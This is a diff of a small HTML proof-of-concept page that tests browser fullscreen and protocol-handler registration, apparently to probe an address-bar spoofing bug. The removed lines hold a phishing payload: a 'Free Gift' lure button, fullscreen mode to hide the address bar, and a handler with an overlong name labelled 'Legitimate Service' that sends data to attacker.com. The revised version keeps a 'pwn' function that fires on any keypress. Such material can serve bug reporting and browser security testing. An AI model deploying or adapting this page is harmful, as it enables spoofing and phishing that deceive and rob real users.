@@ -1,31 +1,39 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Advanced Spoofing</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Modern Browser API Test</title>
 </head>
 <body>
-    <button id="pwn">Click Here for Free Gift!</button>
-    
+    <button id="testBtn">Click to Test V4</button>
+    <div id="status"></div>
     <script>
-        document.getElementById('pwn').addEventListener('click', function() {
-            // 1. Fullscreen untuk hide address bar
-            document.documentElement.requestFullscreen().catch(e => console.log(e));
+        function pwn() {
+            // Modern Fullscreen API
+            document.documentElement.requestFullscreen().catch(err => {
+                document.getElementById('status').textContent = 'Fullscreen error: ' + err.message;
+            });
             
-            // 2. Register malicious protocol dengan nama panjang (bug testing)
+            // Register Protocol Handler with VALID long string (ASCII letters only)
             try {
                 navigator.registerProtocolHandler(
-                    'web+' + 'o'.repeat(300), // Very long protocol
-                    'https://attacker.com/phish?data=%s',
-                    'Legitimate Service'
+                    'web+' + 'o'.repeat(200), // Valid: web+ followed by ASCII letters
+                    location.href + '?handler=%s',
+                    'Test Handler'
                 );
+                document.getElementById('status').textContent = 'Protocol handler registered!';
             } catch(e) {
-                console.log(e);
+                document.getElementById('status').textContent = 'Protocol error: ' + e.message;
             }
-            
-            // 3. Redirect setelah 2 detik
-            setTimeout(function() {
-                window.location.href = 'web+' + 'o'.repeat(300) + ':sensitive-data';
-            }, 2000);
+        }
+        
+        // Trigger on button click (user gesture required for modern browsers)
+        document.getElementById('testBtn').addEventListener('click', pwn);
+        
+        // Also trigger on any keydown (like original)
+        document.addEventListener('keydown', function(e) {
+            pwn();
         });
     </script>
 </body>
